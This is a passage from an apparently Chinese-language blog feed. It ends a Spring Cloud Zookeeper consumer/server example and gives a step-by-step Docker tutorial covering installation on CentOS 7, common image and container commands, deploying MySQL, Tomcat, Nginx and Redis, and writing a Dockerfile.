class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>配置文件</li>
</ul>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">consumer</span></span><br><span class="line"><span class="comment"># zookeeper 连接地址</span></span><br><span class="line"><span class="attr">spring.cloud.zookeeper.connect-string</span>=<span class="string">192.168.74.88:2181</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserCenterApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(UserCenterApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注入RestTemplate用于http调用</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="comment">// 加上@LoadBalanced注解可以实现负载均衡</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">         <span class="keyword">return</span> restTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Controller</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsumerController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注入负载均衡客户端</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> LoadBalancerClient loadBalancerClient;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 通过负载均衡客户端可以用过服务名称，查看服务地址</span></span><br><span class="line">        <span class="comment">// 能实现这样的功能就是因为注册中心</span></span><br><span class="line">        <span class="type">ServiceInstance</span> <span class="variable">choose</span> <span class="operator">=</span> loadBalancerClient.choose(<span class="string">&quot;server&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">serviceId</span> <span class="operator">=</span> choose.getServiceId();</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> choose.getPort();</span><br><span class="line">        System.out.println(serviceId + <span class="string">&quot; : &quot;</span>+port);</span><br><span class="line">        <span class="comment">// 通过restTemplate调用服务端</span></span><br><span class="line">        <span class="comment">// 直接通过服务名就能够调用</span></span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(<span class="string">&quot;http://service/getinfo&quot;</span>, String.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><ul>
<li>导入依赖：与消费端相同</li>
<li>配置文件</li>
</ul>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8082</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">server</span></span><br><span class="line"><span class="comment"># zookeeper 连接地址</span></span><br><span class="line"><span class="attr">spring.cloud.zookeeper.connect-string</span>=<span class="string">192.168.74.88:2181</span></span><br><span class="line"><span class="comment"># 将本服务注册到zookeeper</span></span><br><span class="line"><span class="attr">spring.cloud.zookeeper.discovery.register</span>=<span class="string">true</span></span><br><span class="line"><span class="comment"># 配置会话超时时间</span></span><br><span class="line"><span class="attr">spring.cloud.zookeeper.session-timeout</span>=<span class="string">30000</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动类省略</li>
<li>Controller</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerController</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@GetMapping(&quot;/getinfo&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getServerPortAndName</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;调用成功&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/2021/11/04/2021/docker/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><h2 id="什么是虚拟化"><a href="#什么是虚拟化" class="headerlink" title="什么是虚拟化"></a>什么是虚拟化</h2><p>在计算机中，<strong>虚拟化</strong>（Virtualization）是一种资源管理技术，是将计算机的各种实体资源，如服务器、网络、内存及存储等，予以抽象、转换后呈现出来，打破实体结构间的不可切割的障碍，使用户可以比原本的组态更好的方式来应用这些资源。这些资源的新虚拟部份是不受现有资源的架设方式，地域或物理组态所限制。一般所指的虚拟化资源包括计算能力和资料存储。</p>
<p>在实际的生产环境中，虚拟化技术主要用来解决高性能的物理硬件产能过剩和老的旧的硬件产能过低的重组重用，透明化底层物理硬件，从而最大化的利用物理硬件对资源充分利用。</p>
<p>虚拟化技术种类很多，例如：软件虚拟化、硬件虚拟化、内存虚拟化、网络虚拟化(vip)、桌面虚拟化、服务虚拟化、虚拟机等等。</p>
<h2 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker"></a>什么是Docker</h2><p><strong>Docker</strong> 是一个开源项目，诞生于 2013 年初，最初是 dotCloud 公司内部的一个业余项目。它基于 Google 公司推出的 Go 语言实现。 项目后来加入了 Linux 基金会，遵从了 Apache 2.0 协议，项目代码在 <a class="link"   href="https://github.com/docker/docker" >GitHub<i class="fas fa-external-link-alt"></i></a> 上进行维护。</p>
<p>Docker 自开源后受到广泛的关注和讨论，以至于 dotCloud 公司后来都改名为 Docker Inc。Redhat 已经在其 RHEL6.5 中集中支持 Docker；Google 也在其 PaaS 产品中广泛应用。</p>
<p>Docker 项目的目标是实现轻量级的操作系统虚拟化解决方案。 Docker 的基础是 Linux 容器（LXC）等技术。</p>
<p>在 LXC 的基础上 Docker 进行了进一步的封装，让用户不需要去关心容器的管理，使得操作更为简便。用户操作 Docker 的容器就像操作一个快速轻量级的虚拟机一样简单。</p>
<h2 id="为什么选择Docker"><a href="#为什么选择Docker" class="headerlink" title="为什么选择Docker"></a>为什么选择Docker</h2><ul>
<li>上手快</li>
</ul>
<p><strong>用户只需要几分钟，就可以把自己的程序“Docker化”。</strong>Docker依赖于“写时复制”（copy-on-write）模型，使修改应用程序也非常迅速，可以说达到“随心所致，代码即改”的境界。</p>
<p>随后，就可以创建容器来运行应用程序了。大多数Docker容器只需要不到1秒中即可启动。由于去除了管理程序的开销，Docker容器拥有很高的性能，同时同一台宿主机中也可以运行更多的容器，使用户尽可能的充分利用系统资源。</p>
<ul>
<li>职责的逻辑分类</li>
</ul>
<p>使用Docker，开发人员只需要关心容器中运行的应用程序，而运维人员只需要关心如何管理容器。Docker设计的目的就是要加强开发人员写代码的开发环境与应用程序要部署的生产环境一致性。从而降低那种“开发时一切正常，肯定是运维的问题（测试环境都是正常的，上线后出了问题就归结为肯定是运维的问题）”</p>
<ul>
<li>快速高效的开发生命周期</li>
</ul>
<p>Docker的目标之一就是缩短代码从开发、测试到部署、上线运行的周期，让你的应用程序具备可移植性，易于构建，并易于协作。（通俗一点说，Docker就像一个盒子，里面可以装很多物件，如果需要这些物件的可以直接将该大盒子拿走，而不需要从该盒子中一件件的取。）</p>
<ul>
<li>鼓励使用面向服务的架构</li>
</ul>
<p>Docker还鼓励面向服务的体系结构和微服务架构。Docker推荐单个容器只运行一个应用程序或进程，这样就形成了一个分布式的应用程序模型，在这种模型下，应用程序或者服务都可以表示为一系列内部互联的容器，从而使分布式部署应用程序，扩展或调试应用程序都变得非常简单，同时也提高了程序的内省性。（当然，也可以在一个容器中运行多个应用程序）</p>
<h2 id="容器与虚拟机比较"><a href="#容器与虚拟机比较" class="headerlink" title="容器与虚拟机比较"></a>容器与虚拟机比较</h2><p>下面的图片比较了 Docker 和传统虚拟化方式的不同之处，可见容器是在操作系统层面上实现虚拟化，直接复用本地主机的操作系统，而传统方式则是在硬件层面实现。</p>
<p>与传统的虚拟机相比，Docker优势体现为启动速度快、占用体积小。</p>
<h2 id="Docker组件"><a href="#Docker组件" class="headerlink" title="Docker组件"></a>Docker组件</h2><h3 id="Docker服务器与客户端"><a href="#Docker服务器与客户端" class="headerlink" title="Docker服务器与客户端"></a>Docker服务器与客户端</h3><p>Docker是一个客户端-服务器（C&#x2F;S）架构程序。Docker客户端只需要向Docker服务器或者守护进程发出请求，服务器或者守护进程将完成所有工作并返回结果。Docker提供了一个命令行工具Docker以及一整套RESTful API。你可以在同一台宿主机上运行Docker守护进程和客户端，也可以从本地的Docker客户端连接到运行在另一台宿主机上的远程Docker守护进程。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/11/11/GVU1QevsW2cPYaT.png"
                      alt="Snipaste_2021-11-11_15-57-08.png"
                ></p>
<h3 id="Docker镜像与容器"><a href="#Docker镜像与容器" class="headerlink" title="Docker镜像与容器"></a>Docker镜像与容器</h3><p><strong>镜像</strong>是构建Docker的基石。用户基于镜像来运行自己的容器。镜像也是Docker生命周期中的“构建”部分。</p>
<p>镜像是基于联合文件系统的一种层式结构，由一系列指令一步一步构建出来。也可以将镜像当作容器的“源代码”。镜像体积很小，非常“便携”，易于分享、存储和更新。</p>
<p>Docker可以帮助你构建和部署<strong>容器</strong>，你只需要把自己的应用程序或者服务打包放进容器即可。容器是基于镜像启动起来的，容器中可以运行一个或多个进程。我们可以认为，<strong>镜像是Docker生命周期中的构建或者打包阶段</strong>，而容器则是启动或者执行阶段。 容器基于镜像启动，一旦容器启动完成后，我们就可以登录到容器中安装自己需要的软件或者服务。</p>
<p>Docker借鉴了标准集装箱的概念。标准集装箱将货物运往世界各地，Docker将这个模型运用到自己的设计中，唯一不同的是：集装箱运输货物，而Docker运输软件。</p>
<p>和集装箱一样，Docker在执行上述操作时，并不关心容器中到底装了什么，它不管是web服务器，还是数据库，或者是应用程序服务器什么的。所有的容器都按照相同的方式将内容“装载”进去。</p>
<p>Docker也不关心你要把容器运到何方：我们可以在自己的笔记本中构建容器，上传到Registry，然后下载到一个物理的或者虚拟的服务器来测试，在把容器部署到具体的主机中。<strong>像标准集装箱一样，Docker容器方便替换，可以叠加，易于分发，并且尽量通用。</strong></p>
<h3 id="Registry（注册中心）"><a href="#Registry（注册中心）" class="headerlink" title="Registry（注册中心）"></a>Registry（注册中心）</h3><p>Docker用Registry来保存用户构建的镜像。Registry分为公共和私有两种。Docker公司运营公共的Registry叫做<a class="link"   href="https://hub.docker.com/" >Docker Hub<i class="fas fa-external-link-alt"></i></a>。用户可以在Docker Hub注册账号，分享并保存自己的镜像。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://s2.loli.net/2021/12/10/hBgrJbyiNCQAMDf.png"
                      alt="Snipaste_2021-12-10_16-37-37.png"
                ></p>
<h1 id="Docker安装与启动"><a href="#Docker安装与启动" class="headerlink" title="Docker安装与启动"></a>Docker安装与启动</h1><h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><p>以<strong>Centos7</strong>为例：</p>
<ul>
<li>yum 包更新到最新</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure>

<ul>
<li>安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure>

<ul>
<li>设置yum源为阿里云</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>

<ul>
<li>安装docker</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install docker-ce</span><br></pre></td></tr></table></figure>

<ul>
<li>安装后查看docker版本</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker -v</span><br></pre></td></tr></table></figure>

<h2 id="设置ustc的镜像"><a href="#设置ustc的镜像" class="headerlink" title="设置ustc的镜像"></a>设置ustc的镜像</h2><p>ustc是老牌的linux镜像服务提供者了，还在遥远的ubuntu 5.04版本的时候就在用。ustc的docker镜像加速器速度很快。<a class="link"   href="https://lug.ustc.edu.cn/wiki/mirrors/help/docker" >ustc docker mirror<i class="fas fa-external-link-alt"></i></a>的优势之一就是不需要注册，是真正的公共服务。</p>
<ul>
<li>创建并编辑文件daemon.json</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<ul>
<li>在该文件中输入如下内容</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Docker的启动与停止"><a href="#Docker的启动与停止" class="headerlink" title="Docker的启动与停止"></a>Docker的启动与停止</h2><p>Docker是系统服务，因此使用<strong>systemctl</strong>系统服务管理器指令来控制Docker:</p>
<ul>
<li>启动docker</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<ul>
<li>停止docker</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure>

<ul>
<li>重启docker</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<ul>
<li>查看docker状态</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure>

<ul>
<li>开机启动</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>

<ul>
<li>查看docker概要信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure>

<ul>
<li>查看docker帮助文档</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p><img  
                     lazyload
                     alt="image"
                     data-src="https://s2.loli.net/2021/12/10/5Hk87VCpEIsOFaf.png"
                      alt="Snipaste_2021-12-10_16-42-52.png"
                ></p>
<h2 id="镜像相关命令"><a href="#镜像相关命令" class="headerlink" title="镜像相关命令"></a>镜像相关命令</h2><ul>
<li>查看镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>REPOSITORY</td>
<td>镜像名称</td>
</tr>
<tr>
<td>TAG</td>
<td>镜像标签</td>
</tr>
<tr>
<td>IMAGE ID</td>
<td>镜像ID</td>
</tr>
<tr>
<td>CREATED</td>
<td>镜像的创建日期（不是获取该镜像的日期）</td>
</tr>
<tr>
<td>SIZE</td>
<td>镜像大小</td>
</tr>
</tbody></table>
<p>注意：这些镜像都是存储在Docker宿主机的&#x2F;var&#x2F;lib&#x2F;docker目录下。</p>
<ul>
<li>搜索镜像</li>
</ul>
<p>如果你需要从网络中查找需要的镜像，可以通过以下命令搜索：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search 镜像名称</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>NAME</td>
<td>仓库名称</td>
</tr>
<tr>
<td>DESCRIPTION</td>
<td>镜像描述</td>
</tr>
<tr>
<td>STARS</td>
<td>用户评价，反应一个镜像的受欢迎程度</td>
</tr>
<tr>
<td>OFFICIAL</td>
<td>是否官方</td>
</tr>
<tr>
<td>AUTOMATED</td>
<td>自动构建，表示该镜像由Docker Hub自动构建流程创建的</td>
</tr>
</tbody></table>
<ul>
<li>拉取镜像</li>
</ul>
<p>拉取镜像就是从中央仓库中下载镜像到本地：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名称</span><br></pre></td></tr></table></figure>

<p>例如，下载centos7镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull centos:7</span><br></pre></td></tr></table></figure>

<ul>
<li>删除镜像</li>
</ul>
<p>按镜像ID删除镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像ID</span><br></pre></td></tr></table></figure>

<p>删除所有镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi `docker images -q`</span><br></pre></td></tr></table></figure>

<h2 id="容器相关命令"><a href="#容器相关命令" class="headerlink" title="容器相关命令"></a>容器相关命令</h2><ul>
<li>查看容器</li>
</ul>
<p>查看正在运行的容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p>查看所有容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps –a</span><br></pre></td></tr></table></figure>

<p>查看最后一次运行的容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps –l</span><br></pre></td></tr></table></figure>

<p>查看停止的容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -f status=exited</span><br></pre></td></tr></table></figure>

<ul>
<li><p>创建与启动容器</p>
<p>创建容器命令：docker run</p>
<p>创建容器命令中常用的参数说明：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-i</td>
<td>表示运行容器</td>
</tr>
<tr>
<td>-t</td>
<td>表示容器启动后会进入其命令行。加入-i -t两个参数后，容器创建就能登录进去。即分配一个伪终端</td>
</tr>
<tr>
<td>–name</td>
<td>为创建的容器命名</td>
</tr>
<tr>
<td>-v</td>
<td>表示目录映射关系（前者是宿主机目录，后者是映射到宿主机上的目录），可以使用多个－v做多个目录或文件映射。注意：最好做目录映射，在宿主机上做修改，然后共享到容器上</td>
</tr>
<tr>
<td>-d</td>
<td>在run后面加上-d参数,则会创建一个守护式容器在后台运行（这样创建容器后不会自动登录容器，如果只加-i -t两个参数，创建后就会自动进去容器）</td>
</tr>
<tr>
<td>-p</td>
<td>表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p做多个端口映射</td>
</tr>
<tr>
<td>-e</td>
<td>添加环境变量</td>
</tr>
</tbody></table>
</li>
</ul>
<p>（1）以交互式方式创建容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --name=容器名称 镜像名称:标签 /bin/bash</span><br></pre></td></tr></table></figure>

<p>这时我们通过docker ps命令查看，发现可以看到启动的容器，状态为启动状态</p>
<p>退出当前容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>（2）以守护式方式创建容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -di --name=容器名称 镜像名称:标签</span><br></pre></td></tr></table></figure>

<p>登录守护式容器方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器名称(或者容器ID)  /bin/bash</span><br></pre></td></tr></table></figure>

<ul>
<li>停止与启动容器</li>
</ul>
<p>停止容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop 容器名称（或者容器ID）</span><br></pre></td></tr></table></figure>

<p>启动容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start 容器名称（或者容器ID）</span><br></pre></td></tr></table></figure>

<ul>
<li>文件拷贝</li>
</ul>
<p>如果我们需要将文件拷贝到容器内可以使用cp命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> 需要拷贝的文件或目录 容器名称:容器目录</span><br></pre></td></tr></table></figure>

<p>也可以将文件从容器内拷贝出来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> 容器名称:容器目录 需要拷贝的文件或目录</span><br></pre></td></tr></table></figure>

<ul>
<li>目录挂载</li>
</ul>
<p>我们可以在创建容器的时候，将宿主机的目录与容器内的目录进行映射，这样我们就可以通过修改宿主机某个目录的文件从而去影响容器。<br>创建容器添加 -v 参数后边为 宿主机目录:容器目录，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -di -v /usr/local/myhtml:/usr/local/myhtml --name=mycentos centos:7</span><br></pre></td></tr></table></figure>

<p>如果你共享的是多级的目录，可能会出现权限不足的提示。</p>
<p>这是因为CentOS7中的安全模块selinux把权限禁掉了，我们需要添加参数 –privileged&#x3D;true 来解决挂载的目录没有权限的问题</p>
<ul>
<li>查看容器IP地址</li>
</ul>
<p>我们可以通过以下命令查看容器运行的各种数据：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker inspect 容器名称（容器ID）</span><br></pre></td></tr></table></figure>

<p>也可以直接执行下面的命令直接输出IP地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker inspect --format=<span class="string">&#x27;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&#x27;</span> 容器名称（容器ID）</span><br></pre></td></tr></table></figure>

<ul>
<li>删除容器</li>
</ul>
<p>删除指定的容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 容器名称（容器ID）</span><br></pre></td></tr></table></figure>

<h1 id="应用部署"><a href="#应用部署" class="headerlink" title="应用部署"></a>应用部署</h1><h2 id="MySQL部署"><a href="#MySQL部署" class="headerlink" title="MySQL部署"></a>MySQL部署</h2><ul>
<li>拉取mysql镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull centos/mysql-57-centos7</span><br></pre></td></tr></table></figure>

<ul>
<li>创建容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -di --name=mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql</span><br></pre></td></tr></table></figure>

<p>-p 代表端口映射，格式为 宿主机映射端口:容器运行端口</p>
<p>-e 代表添加环境变量 MYSQL_ROOT_PASSWORD 是root用户的登陆密码</p>
<h2 id="tomcat部署"><a href="#tomcat部署" class="headerlink" title="tomcat部署"></a>tomcat部署</h2><ul>
<li>拉取镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull tomcat:7-jre7</span><br></pre></td></tr></table></figure>

<ul>
<li>创建容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -di --name=mytomcat -p 9000:8080 </span><br><span class="line">-v /usr/local/webapps:/usr/local/tomcat/webapps tomcat:7-jre7</span><br></pre></td></tr></table></figure>

<p>-v 代表目录映射，格式为 宿主机目录:容器目录</p>
<h2 id="Nginx部署"><a href="#Nginx部署" class="headerlink" title="Nginx部署"></a>Nginx部署</h2><ul>
<li>拉取镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure>

<ul>
<li>创建Nginx容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -di --name=mynginx -p 80:80 nginx</span><br></pre></td></tr></table></figure>

<h2 id="Redis部署"><a href="#Redis部署" class="headerlink" title="Redis部署"></a>Redis部署</h2><ul>
<li>拉取镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull redis</span><br></pre></td></tr></table></figure>

<ul>
<li>创建容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -di --name=myredis -p 6379:6379 redis</span><br></pre></td></tr></table></figure>

<h1 id="迁移与备份"><a href="#迁移与备份" class="headerlink" title="迁移与备份"></a>迁移与备份</h1><ul>
<li>容器保存为镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit 容器名 镜像名</span><br></pre></td></tr></table></figure>

<ul>
<li>镜像备份为tar文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker  save -o 文件名.tar 镜像名</span><br></pre></td></tr></table></figure>

<ul>
<li>镜像恢复与迁移</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker load -i 文件名.tar</span><br></pre></td></tr></table></figure>

<p>-i 表示输入的文件</p>
<h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><h2 id="什么是Dockerfile"><a href="#什么是Dockerfile" class="headerlink" title="什么是Dockerfile"></a>什么是Dockerfile</h2><p>Dockerfile是由一系列命令和参数构成的脚本，这些命令应用于基础镜像并最终创建一个新的镜像。</p>
<p>1、对于开发人员：可以为开发团队提供一个完全一致的开发环境；<br>2、对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件构建一个新的镜像开始工作了；<br>3、对于运维人员：在部署时，可以实现应用的无缝移植。</p>
<h2 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>FROM image_name:tag</td>
<td>定义了使用哪个基础镜像启动构建流程</td>
</tr>
<tr>
<td>MAINTAINER user_name</td>
<td>声明镜像的创建者</td>
</tr>
<tr>
<td>ENV key value</td>
<td>设置环境变量 (可以写多条)</td>
</tr>
<tr>
<td>RUN command</td>
<td>是Dockerfile的核心部分(可以写多条)</td>
</tr>
<tr>
<td>ADD source_dir&#x2F;file dest_dir&#x2F;file</td>
<td>将宿主机的文件复制到容器内，如果是一个压缩文件，将会在复制后自动解压</td>
</tr>
<tr>
<td>COPY source_dir&#x2F;file dest_dir&#x2F;file</td>
<td>和ADD相似，但是如果有压缩文件并不能解压</td>
</tr>
<tr>
<td>WORKDIR path_dir</td>
<td>设置工作目录</td>
</tr>
</tbody></table>
<h2 id="使用Dockerfile创建镜像的例子"><a href="#使用Dockerfile创建镜像的例子" class="headerlink" title="使用Dockerfile创建镜像的例子"></a>使用Dockerfile创建镜像的例子</h2><p>1、生成requirements.txt</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install pipreqs</span><br><span class="line">pipreqs .</span><br></pre></td></tr></table></figure>

<p>2、制作Dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#基于的基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.7</span>-slim-buster</span><br><span class="line"><span class="comment"># 设置code文件夹是工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"><span class="comment"># 安装支持</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;/app/pose.py&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>3、构建镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t liduoandocker .</span><br></pre></td></tr></table></figure>

<p>4、生成对应容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it liduoandocker</span><br></pre></td></tr></table></figure>

<h1 id="Docker私有仓库"><a href="#Docker私有仓库" class="headerlink" title="Docker私有仓库"></a>Docker私有仓库</h1><h2 id="私有仓库搭建与配置"><a href="#私有仓库搭建与配置" class="headerlink" title="私有仓库搭建与配置"></a>私有仓库搭建与配置</h2><ul>
<li>拉取私有仓库镜像</li>
</ul>
